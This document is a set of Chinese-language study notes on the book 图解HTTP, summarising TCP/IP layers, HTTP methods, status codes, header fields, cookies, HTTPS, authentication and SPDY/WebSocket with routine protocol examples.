# 图解 HTTP 读后感

## 一、了解 web 及网络基础

### 1.TCP/IP 的分层管理（分为 4 层）

#### 1.应用层

> 应用层决定了向用户提供应用服务时通信的活动。

> TCP/IP 协议族内预存了各类通用的应用服务

- FTP（File Transfer Protocol，文件传输协议）
- DNS（Domain Name System，域名系统）
- HTTP

#### 2.传输层

> 传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输

- TCP（Transmission Control Protocol，传输控制协议）
- UDP（User Data Protocol，用户数据报协议）

#### 3.网络层

> 网络层用来处理在网络上流动的数据包。

> 数据包是网络传输的最小数据单位。

> 该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。

> 与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。

#### 4.链路层（又名数据链路层，网络接口层）

> 用来处理连接网络的硬件部分
> 包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。

### 2.IP、TCP、DNS

#### 1.IP（网络层）

1. IP 地址指节点被分配到的地址
2. MAC 地址指网卡所属的固定地址
3. IP 间依赖 MAC 地址采用 ARP 协议通信
4. ARP 是一种解析地址的协议，根据通信的 IP 地址可以反查出对应的 MAC 地址

#### 2.TCP（传输层）

1. tcp 提供可靠的字节流服务
2. tcp 将大块数据分割成以报文段为单位的数据包进行管理
3. tcp3 次握手（保证通信的可靠性）

![three way handshaking](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/tcp_%20three_way_handshaking.png?raw=true)

#### 3.DNS（和 HHTP 一样属于应用层协议）

1. DNS 提供域名到 IP 地址之间的解析服务

#### 4.各种协议与 HTTP 协议的关系

![communication](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/http_protocol.png?raw=true)

### 3.URI 和 URL

#### 1.URI

1. 由某个协议方案表示的资源的定位标识符
2. 协议方案指访问资源所使用的协议类型名称
3. 采用 HTTP 协议时，协议方案就是 http
4. URI 用字符串标识某一互联网资源

#### 2.URL

1. URL 表示资源的地点, URL 是 URI 的子集

## 二、简单的 HTTP 协议

### 1.HTTP 协议用于客户端和服务器端通信

### 2.通过请求和响应达成通信

1. 请求报文的组成
   - 请求方法
   - 请求 URL
   - 协议版本
   - 可选的请求首部字段
   - 内容实体
2. 响应报文的组成
   - 协议版本
   - 状态码
   - 解释状态码的原因短语
   - 可选的响应首部字段
   - 实体主体

### 3.HTTP 无状态协议

### 4.HTTP 通过 URI（我们使用 URL）定位互联上的资源

1. 对服务器本身发起请求，可以用\*来代替请求 URI。
2. 查询 HTTP 服务器端支持的 HTTP 方法的种类

```
OPTIONS * HTTP/1.1
```

#### 5.HTTP 方法

1.  GET: 获取资源
2.  POST: 传输实体主体
3.  PUT: 传输文件
    - 像 FTP 协议的文件上传一样
    - http/1.1 的 PUT 方法自身不带验证机制，任何人都可以上传文件，存在安全性问题
    - 响应返回状态码 204 No Content（比如： 该 html 已存在于服务器上）
4.  HEAD: 获得报文首部
    - 和 GET 方法一样，不返回报文主体部分
    - 用于确认 URL 的有效性及资源更新的日期时间
    - 响应返回 Index.html 有关的响应首部
5.  DELETE: 删除文件
    - 请求 url 删除指定资源
    - 响应返回状态码 204 No Content（比如 ：该 html 已从该服务器上删除）
6.  OPTIONS: 询问支持的方法

    - OPTIONS 方法用来查询针对请求 URL 指定的资源支持的方法

    | 请求 | OPTIONS \* http/1.1<br/> Host: www.hackr.jp                          |
    | :--- | :------------------------------------------------------------------- |
    | 响应 | HTTP/1.1 200OK<br/>Allow:GET,POST,HEAD,OPTIONS(返回服务器支持的方法) |

7.  TRACE: 追踪路径
    _ 让 web 服务器端将之前的请求通信环回给客户端的方法
    _ 容易引发 XST（cross-site tracing, 跨站追踪）攻击
    _ 在 Max-Forwards 首部字段中填入数值
    _ 每经过一个服务器端就将该数字减 1，减到 0 时，就停止继续传输 \* 最后接收到请求的服务器端则返回状态码 200OK 的响应

    | 请求 | TRACE / HTTP/1.1<br/> Host: hackr.jp<br/>Max-Forwards:2 |
    | :--- |:-------------------- |
    | 响应 | HTTP/1.1 200OK<br/>Content-Type:message/http<br/>Content-Length: 1024<br/>TRACE / HTTP/1.1<br/>Host:hackr.jp<br/>Max-Forwards: 2(返回响应包含请求内容) |

    8.CONNECT: 要求用隧道协议连接代理
    _ 与代理服务器通信时建立隧道, 实现用隧道协议进行 TCP 通信
    _ 主要用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security, 传输层安全）通信协议将通信内容加密后经网络隧道传输 \* CONNECT 代理服务器名:端口号 HTTP 版本

    | 请求 | CONNECT proxy.hackr.jp:8080 HTTP/1.1 <br/> Host: proxy.hackr.jp |
    | :--- | :-------------------------------------------------------------- |
    | 响应 | HTTP/1.1 200 OK（之后进入网络隧道）                             |

#### 6.使用方法下达命令

![http method](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/http_method.png?raw=true)

#### 7.持久连接

1. HTTP 的初始版本，每进行一次 HTTP 通信，都要进行 TCP 的连接和断开
2. HTTP1.1 提出了持久连接（HTTP keep-alive）,只要任意一端没提出断开连接，则保持 TCP 连接状态
3. 持久连接旨在建立 1 次 TCP 连接，进行多次请求和响应的交互
4. 持久连接的优点
   - 减少 TCP 连接断开的开销，减轻服务器负载
   - 节省了 HTTP 请求和响应的时间

#### 8.管线化

- 同时并行发送多个请求

#### 9.Cookie 的状态管理

- 无状态协议，不必保存状态，可以减少服务器的 CPU 及内存资源的消耗
- Cookie 根据服务端发送的响应报文内一个叫 Set-Cookie 的首部字段信息，通知客户端保存 Cookie
- 客户端下次请求，会在请求报文中加入 Cookie 值发送出去
- 服务端根据客户端发送来的 Cookie，对比服务器上的记录，得到之前的状态信息

#### 10.编码提升传输速率

- 编码能提升传输速率，但是会消耗更多的 CPU 资源
- 常用的内容编码
  - gzip(GNU zip)
  - compress(UNIX 系统的标准压缩)
  - deflate(zlib)
  - identity(不进行编码)

#### 11.HTTP 状态码

![http status code](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/http_status_code.png?raw=true)

- 2XX 成功

  - 200 OK
    - 使用 GET 方法，请求资源的实体会作为响应返回
    - 使用 HEAD 方法，响应中只返回首部，不返回实体的主体部分
  - 204 No Content

    - 服务器接收请求，响应的报文中不含实体的主体
    - 用于只需要客户端往服务器发送信息

  - 206 Partial Content

    - 请求头中添加请求头：`Range: bytes=0-1023`
    - 响应报文中包含由 Content-Range 指定范围的实体内容

- 3XX 重定向
  - 301 Moved Permanently（永久重定向）
    - 请求的资源已经被分配了新的 URI（URL 是 URI 的一种实现）
  - 302 Found（临时重定向）
    - 已移动的资源的 URI 将来还有可能发生改变
  - 303 See Other
    - 明确表示客户端应当采用GET方法获取资源
  - 304 Not Modified
    - 客户端发送附带条件的请求（If-Match, If-Modified-Since, If-None-Match, If-Range, If-Unmodified-Since）时，服务器允许请求访问资源，但未满足条件的情况
    - 304状态码返回，表示不包含任何响应的主体部分
  - 307 Temporary Redirect（临时重定向）
    - 307会遵循浏览器标准，不会从POST变成GET
- 4XX客户端错误
  - 400 Bad Request
    - 请求报文中存在语法错误   
  - 401 Unauthorized
    - 表示发送的请求需要通过HTTP认证（BASIC认证、DIGEST认证）
    - 第二次返回401，则表示用户认证失败
  - 403 Forbidden
    - 拒绝理由可以放在实体的主体部分
    - 发生原因
      - 未获得文件系统的访问授权
      - 未授权发送源的IP地址
  - 404 Not Found
    - 服务器上没有请求的资源
- 5XX服务器错误
  - 500 Internal Server Error
    - 服务器执行请求发生了故障
    - web应用存在BUG，或临时故障
  - 503 Service Unavailable
    - 服务器处于超负荷
    - 正在进行停机维护
    - 最好写入RetryAfter首部字段返回给客户端
#### 12.单台虚拟主机实现多个域名
    - 服务器内托管多个域名
    - 域名通过DNS解析映射到相同的IP地址上
    - 发送HTTP请求时，必须在HOST首部内完整指定主机名或域名的URL

#### 13.通信数据的转发程序
    - 代理
      - 具有转发功能的应用程序
      - 接收客户端发送的请求发送给服务器
      - 接受服务器返回的响应发送给客户端
      - HTTP通信，通过代理服务器转发时，会追加via首部信息标记经过的主机信息
      - Caching Proxy(缓存代理)
        - 预先将资源的副本保存在代理服务器上
        - 接收到对相同资源的请求时，将缓存的资源作为响应返回
      - Transparent Proxy(透明代理)
        - 不对报文做任何加工的代理类型
    - 网关
      - 对请求进行处理，转发其他服务器通信数据的服务器
      - 客户端不会察觉自己的通信目标是一个网关
      - 网关能使服务器提供非HTTP协议
      - 利用网关可以提高通信的安全性
    - 隧道
      - 在相隔甚远的客户端和服务端两者之间进行中转
      - 保持双方通信连接的应用程序
      - 隧道上使用SSL加密手段进行通信，保证通信的安全性
#### 14.缓存代理服务器
    - 服务器返回响应时，代理服务器将会保存一份资源的副本
    - 因为客户端的要求，缓存的有效期等因素，向源服务器确认资源的有效性，若缓存失效，则缓存服务器将再次从源服务器获取新资源
    - 节省了通信流量和通信时间
#### 15.其他协议
    - FTP（File Transfer Protocol）
      - 传输文件使用的协议
    - NNTP(Network News Transfer Protocol)
      - 用于NetNews电子会议室内传达消息的协议
    - Archie
      - 搜索anonymous FTP公开的文件信息的协议
    - WAIS(Wide Area Informations Servers)
      - 以关键字检索多个数据库使用的协议
    - Gopher
      - 查找与互联网连接的计算机内信息的协议
#### 16.HTTP首部
##### General Header Fields(通用首部字段)
![general header fields](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/general_header_fields.png?raw=true)
##### Request Header Fields(请求首部字段)
![request header fields](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_request_header_fields.png?raw=true)
##### Response Header Fields(响应首部字段)
![response header fields](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/response_header_fields.png?raw=true)
##### Entity Header Fields(实体首部字段)
![entity header fields](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/entity_header_fields.png?raw=true)

#### 17.HTTP/1.1 通用首部字段
1. Cache-Control
> eg. Cache-Control: private, max-age=0, no-cache
* 缓存请求响应

  | 指令             | 参数   | 说明                         |
  | :--------------- | :----- | :--------------------------- |
  | no-cache         | 无     | 强制向原服务器再次验证       |
  | no-store         | 无     | 不缓存请求或响应的任何内容   |
  | max-age=[秒]     | 必需   | 响应的最大Age值              |
  | max-stale(=[秒]) | 可省略 | 接收已过期的响应             |
  | min-fresh=[秒]   | 必需   | 期望在指定时间内的响应仍有效 |
  | no-transform     | 无     | 代理不可更改媒体类型         |
  | only-if-cached   | 无     | 从缓存获取资源               |
  | cache-extension  | -      | 新指令标记（token）          |

* 缓存响应指令
 
  | 指令             | 参数   | 说明                                           |
  | :--------------- | :----- | :--------------------------------------------- |
  | public           | 无     | 可向任意方提供响应的缓存                       |
  | private          | 可省略 | 仅向特定用户返回响应                           |
  | no-cache         | 可省略 | 缓存前必须先确认其有效性                       |
  | no-store         | 无     | 不缓存或响应的任何内容                         |
  | no-transform     | 无     | 代理不可更改媒体类型                           |
  | must-revalidate  | 无     | 可缓存但必须向源服务器进行确认                 |
  | proxy-revalidate | 无     | 要求中间缓存服务器对缓存的响应有效性在进行确认 |
  | max-age=[秒]     | 必需   | 响应的最大Age值                                |
  | s-maxage=[秒]    | 必需   | 公共缓存服务器响应的最大Age值                  |
  | cache-extension  | -      | 新指令标记(token)                              |

2. Connection
  * 控制不再转发给代理的首部字段
    ![conection_remove](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/connection1.png?raw=true)
  * 管理持久连接
    ![connection_keep_alive](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/connection2.png?raw=true)
3. Date
  > eg. Date: Tue, 03 Jul 2012 04:40:59 GMT
4. Pragma
  > eg. Pragma: no-cache(为了兼容，需加上Cache-Control: no-cache)
  要求所有的中间服务器不返回缓存资源
5. Trailer
  > eg. Trailer: Expires(事先说明报文主体记录了哪些首部字段)
6. Transfer-Encoding
  用这种传输编码方式发送
  > Transfer-Encoding: chunked
7. Upgrade
  * 用于检测协议是否可使用更高的版本进行通信
  * 需要与connection搭配使用
    ```js
    Upgrade: TLS/1.0, HTTP/1.1
    Connection: Upgrade
    ```
  * 服务器对这种请求可返回 101 Switching Protocols状态码
8. Via
  追踪客户端与服务器之间的请求和响应报文的传输路径
9. Warning
  * 告知用户一些与缓存相关的问题的警告
  * Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])
  * Warning: 113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03
  * ![warning status](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/http_warning.png?raw=true)
#### 18.请求首部字段
1. Accept
  * 通知服务器，客户端可接受的媒体类型，及媒体类型优先级
  * eg.  ```Accept: text/html,application/xhtml+xml,application/xml;q=0.9```
  * 媒体类型
    * 文本文件
      * text/html, text/plain, text/css ...
      * application/xhtml+xml, application/xml ...
    * 图片文件
      * image/jpeg, image/gif, image/png ...
    * 视频文件
      * video/mpeg, video/quicktime ...
    * 应用程序使用的二进制文件
      * application/octet-stream, application/zip 
  * q= 来额外表示权重值, q的范围0-1
2. Accept-Charset
  * 通知服务器用户代理支持的字符集及字符集的相对优先顺序
  * ```Accept-Charset: iso-8859-5, unicode-1-1;q=0.8```
3. Accept-Encoding
  * 告知服务器用户代理支持的内容编码及内容编码的优先级顺序,可指定多种内容编码
  * ```Accept-Encoding: gzip, deflate```
  * 支持的内容的编码
    * gzip
    * compress
    * deflate
    * identity
4. Accept-Language
  * 告知服务器用户代理能够处理的自然语言集，以及自然语言集的优先级
  * ```Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3```
5. Authorization
  * 告知服务器，用户代理的认证信息
  * ```Authorization: Basic dWVub3NlbjpwYXNzd29yZA==```
6. Expect
  * 客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为。
  * ```Expect: 100-continue```
7. From
  * 告知服务器使用用户代理的用户的电子邮件地址
  * ```From: info@hackr.jp```
8. Host
  * 告知服务器，请求的资源所处的互联网主机名和端口号
  * ```Host: www.hackr.jp```
  * 请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。
  * 但如果，相同的 IP 地址下部署运行着多个域名(一台服务器运行着多个虚拟主机)，那么服务器就会无法理解究竟是哪个域名对应的请求。
  * 因此，就需要使用首部字段 Host 来明确指出请求的主机名
9. If-Match
  * 只有当客户端请求的If-Match字段值与服务器资源的实体标记ETag匹配一致，服务器才会接受请求
10. If-Modified-Since
  * 如果在If-Modified-Since字段指定的日期时间后，资源发生了更新，服务器会接受请求, 返回200 OK, 附带Last-Modified（最近的更新时间）。
  * 否则返回304 Not Modified
  * If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性
  * 获取资源的更新日期时间，可通过确认首部字段Last-Modified来确定
11. If-None-Match
  * 与ETag值不一致时，可处理该请求, 与If-Match首部字段的作用相反
  * 在GET或HEAD方法中使用If-None-Match可获取最新的资源
12. If-Range
  * If-Range字段值若是跟ETag值或更新的日期时间匹配一致，就作为范围请求处理
  * 若不一致，则忽略范围请求，返回全部资源
  * 请求示例:
    ```js
    GET /index.html
    If-Range: "123456"
    Range: bytes=5001-10000
    ```
  * 返回示例（If-Range与ETag一致）
    ```js
    206 Partial Content
    Content-Range: bytes 5001-10000/10000
    Content-Length: 5000
    ```
  * 返回示例(If-Range与ETag不一致)
    ```js
    200 OK
    ETag: "56789"
    ```
13. If-Unmodified-Since
    * 指定的请求资源在指定的时间内未发生更新，才能处理请求
    * eg.
      ```js
      If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT
      ```
    * 指定时间后发生了更新，则以412 Precondition Failed作为响应
14. Max-Forwards
    * 每经过一次服务器转发请求，Max-Forward值减1
    * 当服务器收到Max-Forwards值为0的请求时，则不再转发，直接返回响应
15. Proxy-Authorization
    * 告知服务器认证所需要的信息
    * 发生在客户端与代理之间
    * eg.
      ```js
      Proxy-Authorization: Basic dGlwOjkpNlAGfFy5
      ```
16. Range
    * 获取部分资源的范围请求
    * ```js Range: bytes=5001-10000 ```
    * 服务器处理请求后返回状态码```js 206 Partial Content```
17. Referer
    * 首部字段Referer会告知服务器请求的原始资源URI
    * ```js Referer: http://www.hackr.jp/index.html```
18. TE
    * 告知服务器，客户端能够处理响应的传输编码方式及相应的优先级
    * ```js TE: gzip, deflate; q=0.5 ```
19. User-Agent
    * 传达浏览器种类和代理名称等信息给服务器
    * ```js User-Agent: Mozilla/5.0(Windows NT 6.1; WOW64; rv:13.0) ```
#### 19.响应首部字段
1. Accept-Range
    * 告知客户端，服务器是否能够处理范围请求
    * 可处理范围请求：```js Accept-Range: bytes```
    * 不能处理范围请求：```js Accept-Range: none```
2. Age
    * 告知客户端，源服务器在多久前创建了响应，字段值单位为秒
    * 若创建该响应的是缓存服务器，Age值是指缓存后的响应再次发起认证到认证完成的时间值
    * ```js Age: 600```
3. Etag
    * 将资源以字符串形式做唯一性标识的方式
    * 服务器会为每份资源分配对应的Etag值
    * 资源更新时，Etag值也会更新
    * 强Etag值：无论实体发生多么细微的变化都会改变其值
        * ```js Etag: "usagi-1234" ```
    * 弱Etag值：只有资源发生了根本变化，产生差异才会改变Etag值
        * ```js Etag: W/"usage-1234" ```
4. Location
    * 使用Location将响应接收方引导至与请求URI不同的资源
    * 配合```3xx: Redirection```，提供重定向的URI
    * 几乎所有的浏览器接收到Location后，都会强制性的尝试对已提示的重定向资源访问
5. Proxy-Authenticate
    * `Proxy-Authenticate: Basic realm="Usagidesign Auth"`
    * 会把代理服务器所要求的认证信息，发送给客户端
    * 客户端与服务器进行认证时，首部字段`www-Authorization`有着相同的作用
6.  Retry-After
    * `Retry-After: 120`
    * 告知客户端在多久之后再次发出请求
    * 与`503 Service Unavailable`响应，或`3xx Redirect`响应一起使用
    * 字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24GMT 等格式），也可以是创建响应后的秒数。
7.  Server
    * `Server: Apache/2.2.6 (Unix) PHP/5.2.5` 
    * 告知客户端当前服务器上安装的`http`服务器名称、版本号等
8.  Vary
    * `Vary: Accept-Language`
    * 如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。
9.  WWW-Authenticate
    * `WWW-Authenticate: Basic realm="Usagidesign Auth"`
    * 告知客户端适用于的认证方案
#### 20.实体首部字段
> 在请求和响应的HTTP报文中，都含有与实体相关的首部字段
1. Allow
    * `Allow: GET, HEAD`
    * 通知客户端能够支持的`Request-URI`指定资源的`HTTP`方法
    * 服务器接收到不支持的`HTTP`方法，会以`405 Method Not Allowed`作为响应返回, 同时还会把所有支持的`HTTP`方法写入首部字段`Allow`后返回
2. Content-Encoding
    * `Content-Encoding: gzip`
    * 告知客户端服务器对实体的主体部分选用的内容编码方式
    * 主要采用4种内容编码方式
      * gzip
      * compress
      * deflate
      * identity 
3. Content-Language
    * `Content-Language: zh-CN`
    * 告知客户端，实体主体所使用的自然语言
4. Content-Length
    * `Content-Length: 15000` 
    * 表示实体的大小
    * 对实体主体进行内容编码时，不再使用`Content-Length`首部字段
5. Content-Location
    * `Content-Location: http://www.hackr.jp/index-ja.html`
    * 表示报文主体返回资源对应的URI
    * 当访问的页面内容与实际请求的对象不同时，首部字段会写明URI
6. Content-MD5
    * `Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==`
    * 检测报文主体在传输过程中是否保持完整，以及确认传输到达
7. Content-Range
    * `Content-Range: bytes 5001-10000/10000`
    * 告知客户端作为响应返回的实体哪个部分符合范围请求
8. Content-type
    * `Content-Type: text/html; charset=UTF-8`
    * 实体内对象的媒体类型
9. Expires
    * `Expires: Wed, 04 Jul 2012 08:26:05 GMT`
    * 将资源失效的日期告知客户端
    * 服务器接收到首部字段`Expires`的响应后，会以缓存应答请求，当超过指定时间后，会向源服务器请求资源
    * `Cache-Control`的优先级高于`Expires`  
10. Last-Modified
    * `Last-Modified: Wed, 23 May 2012 09:59:55 GMT`
    * 指定资源最终修改的时间
#### 21.为Cookie服务的首部字段
1. Cookie的工作机制时用户识别和状态管理
2. 调用Cookie时，可校验有效期，发送域，路径，协议信息，所以正规发布的Cookie内的数据不会因web站点的攻击而泄露
3. Cookie的规格标准文档有4种
  * RFC2616(标准化)
  * RFC2019
  * RFC2965
  * RFC6265
4. 服务器开始准备管理客户端的状态时，会通过`Set-Cookie`事先告知各种信息
  * `Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31`
  * `Set-Cookie`的属性

| 属性         | 说明                                                                   |
| :----------- | :--------------------------------------------------------------------- |
| NAME=VALUE   | 赋予cookie的名称和其值(必需项)                                         |
| expires=DATE | Cookie的有效期（若不明确指定则默认为浏览器关闭前停止）                 |
| path=PATH    | Cookie适用对象的服务器文件目录（若不指定，则默认为文档所在的文件目录） |
| domain=域名  | Cookie适用对象的域名（若不指定，则默认为创建Cookie的服务器域名）       |
| Secure       | 仅在HTTPS安全通信时才会发送Cookie                                      |
| HttpOnly     | 加以限制，使Cookie不能被javascript脚本访问（可以防止XSS攻击）          |
5. 客户端想获得HTTP状态管理支持时，会在请求中包含从服务器接收到的Cookie 
#### 22.其他首部字段
1. X-Frame-Options
  * HTTP响应首部
  * `X-Frame-Options: DENY`
  * 控制网站内容是否在其他web站点的frame标签内显示
  * DENY ：拒绝
  * SAMEORIGIN ：仅同源域名下的页面（Top-level-browsingcontext）匹配时许可。
2. X-XSS-Protection
  * HTTP响应首部
  * `X-XSS-Protection: 1`
  * 针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器XSS防护机制的开关
  * 0: 将XSS过滤设置成无效状态
  * 1: 将XSS过滤设置成有效状态
3. DNT(Do Not Track拒绝个人信息被收录)
  * HTTP 请求首部
  * 表示拒绝被精准广告追踪的方法
  * 0: 同意被追踪
  * 1：拒绝被追踪
4. P3P(The Platform for Privacy Preferences，在线隐私偏好平台)
  * HTTP响应首部
  * `P3P: CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa`
  * 使web网站上的个人隐私变成一种仅供程序可理解的形式, 达到保护用户隐私的目的

## 三、HTTPS

#### 23.http的缺点

1. 通信使用明文（不加密），内容可能被窃听
  * http本身不具备加密的功能，http报文使用明文进行发送
  * tcp/ip是可能被窃听的网络
  * 防止被窃听的加密方式
    * 通信的加密
      * 通过和SSL(secure socket layer, 安全套接层)或TLS(transport layer security, 安全层传输协议)的组合使用，加密http通信的内容
      * 用ssl建立安全通信线路后，就可以在这条线路上进行http通信了，与ssl组合使用的http被称为HTTPS(http secure)
    * 内容的加密
      * 对报文主体进行加密
      * 由于通信线路未被加密处理，所以内容仍然有被篡改的风险
2. 不验证通信方的身份，因此有可能遭遇伪装
  * 无法确定响应的服务器，是否是已伪装的web服务器
  * 无法确定响应返回的客户端，是否是已伪装的客户端
  * 无法确定正在通信的对方，是否具备访问权限
  * 无法判定请求来源何方
  * 无法阻止海量请求下的dos攻击
  * ssl通过使用证书用于确定对方
3. 无法证明报文的完整性，所以有可能已遭篡改
 
#### 24.HTTP + 加密 + 认证 + 完整性保护 = HTTPS
  1. ![http theory](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/https%E5%8E%9F%E7%90%86.PNG?raw=true)
  2. HTTPS是身披SSL外壳的HTTP
      * HTTP先和SSL通信，SSL再和TCP通信
  3. SSL采用一种叫做公开密钥加密的加密处理方式
  4. 对称密钥加密
      * 加密和解密用同一个密钥的方式称为共享密钥加密(对称密钥加密)
      * 发送密钥给对方，存在被窃听的风险
  5. 非对称密钥加密
      * 发送公开密钥给对方
      * 对方用公开密钥加密报文，发送过来
      * 收到用公开密钥加密的报文，用私有密钥进行解密
      * 解密的过程是对离散对数进行求值
  6. Https使用混合加密方式进行加密(非对称加密通信效率低)
      1. 使用非对称加密交换密钥
      2. 使用对称加密进行通信
  7. 证明公钥正确性的证书
      1. 服务器向CA(数字证书认证机构)发出公钥的申请
      2. CA会对公钥进行数字签名，并将该公钥放入公钥证书中，将公钥证书发给服务器
      3. 服务器将公钥证书（数字证书）发送给客户端
      4. 客户端用CA的公钥对公钥证书（数字证书）的数字签名进行验证
      5. 浏览器开发商一般会在浏览器内部值入常用认证机关的公钥
  8. Https也可使用客户端证书
  9. OpenSSL让每个人可以自己给自己颁发证书，但该证书在互联网上不可用，浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网
站的安全证书存在问题”等警告消息。
  10. HTTPS通信速度HTTP慢2到100倍(大量的消耗CPU和内存资源)
 
## 四、确认访问用户身份的认证

1. 认证信息通常指这些
     1. 密码：只有本人才知道的字符串信息
     2. 动态令牌：仅限本人持有的设备内显示的一次性密码
     3. 数字证书：仅限本人（终端）持有的信息
     4. 生物认证：指纹和虹膜等本人的生理信息
     5. IC卡：仅限本人持有的信息
2. HTTP使用的认证方式
     1. BASIC认证（基本认证）
     2. DIGEST认证（摘要认证）
     3. SSL客户端认证
     4. FormBase认证（基于表单认证）
3. BASIC认证
     1. HTTP1.0定义的认证方式
     2. BASIC采用的是base64编码，被盗的可能性极高
     3. ![basic 认证](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/basic%E8%AE%A4%E8%AF%81.PNG?raw=true)
4. DIGEST认证
     1. HTTP1.1定义的认证方式
     2. ![digest 认证](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/digest%E8%AE%A4%E8%AF%81.PNG?raw=true)
5. SSL认证
     1. HTTPS的客户端证书完成的认证方式
     2. 服务器，接收到需要认证资源的请求，会发送Certificate Request报文，要求客户端提供证书
     3.  客户端，把客户端证书信息以Client Certificate报文发送给服务器
     4.  服务器，验证客户端证书通过后，领取客户端证书内的公钥，然后开始https加密通信
     5.  SSL认证一般采用客户端证书和表单认证（密码）的双因素认证方式
     6.  SSL认证使用的证书会产生运营费用
6. 表单认证
     1. 表单认证不是http协议内定义的
     2. 表单认证是目前最常用的认证方式
     3. 客户端，将用户ID和密码放入报文的实体，以POST的方式发送给服务器，使用HTTPS通信进行HTML表单画面的显示和用户输入数据的传达
     4.  服务器，验证客户端发送过来的登录信息进行身份认证，将用户的认证状态和Session ID绑定后记录到服务端
     5.  服务器，返回响应时，会在首部字段Set-Cookie内写入Session ID（如：PHPSESSID=028a8c…） 
     6.  为了防止Session ID被盗，Session ID应使用难以推测的字符串，服务器也应该进行有效期的管理，保证安全性
     7.  为了减轻跨站脚本攻击（XSS）造成的损失，需事先在cookie上加上httponly的属性
     8.  客户端接收到服务器发送来的Session ID后，会将Cookie保存在本地
     9.  下次向服务器发送请求时，浏览器会自动带上Cookie, Session ID也被随之发送给服务器
     10. 服务器通过验证Session ID识别用户和认证状态
     11. 服务器保存用户密码等登录信息的常用方法
        1. 先给密码加盐salt(服务器随机生成的字符串，和字符串连接生成散列值)增加额外信息
        2. 再使用散列(hash)函数计算出散列值后保存
    12. ![表单认证](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81.PNG?raw=true)
## 五、基于HTTP的功能追加协议
1. 基于HTTP的协议
   1. HTTP功能不足
   2. HTTP自身性能有限
   3. 出现了基于HTTP的新协议(在HTTP的基础上，添加了新的功能)
   4. SPDY(google发布的协议)，现已被HTTP2取代
2. HTTP的瓶颈
    1. 一条连接上只可发送1个请求
    2. 请求只能从客户端开始，客户端不可以接收除响应以外的指令
    3. 请求/响应 未经压缩就发送，首部信息越多，延迟越大
    4. 发送冗长的首部，每次互相发送相同的首部，造成的网络浪费较多
    5. 可任意选择数据压缩格式
    6. 早期出现的解决HTTP性能瓶颈的2种方法
        1. Ajax解决方法
           1. 局部web页面替换加载异步通信
           2. 只更新一部分页面，传输的数据量会变少
           3. 可能导致大量请求产生
        2. Comet的解决方法 
           1. Comet会先将响应处于挂起状态
           2. 服务端有内容更新时，返回该响应
           3. 连接的时间变长，消耗更多的资源
3. SPDY
    1. 在TCP/IP的应用层与传输层之间新加会话层实现
    2. SPDY规定会话种使用SSL
    3. 还是采用HTTP建立通信连接，照常使用POS，GET，COOKIE以及HTTP报文
    4. ![SPDY](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/spdy.PNG?raw=true)
    5. spdy的优点
       1. 多路复用, 单一的TCP连接，可以无限制的处理多个HTTP请求，所有请求都在同1个TCP连接上完成，TCP处理效率得到提高
       2. 赋予请求优先级
       3. 压缩HTTP首部
       4. 推送功能
       5. 服务器提示功能
4. WebSocket
    1. web浏览器和web服务器之间的全双工通信标准
    2. 服务器与客户端建立起websocket协议通信连接后，可相互发送JSON, XML, HTML或图片等任意格式的数据
    3. WebSocket的主要特点
        1. 推送功能， 服务器不必等待客户端的请求，直接发送数据
        2. 减少通信量，websocket的首部信息很小，通信量也相应减少了
        3. 实现WebSocket通信，需要在HTTP建立连接后，完成1次握手的步骤
            * 握手-请求
            * 握手-响应
    4. example
        ```js
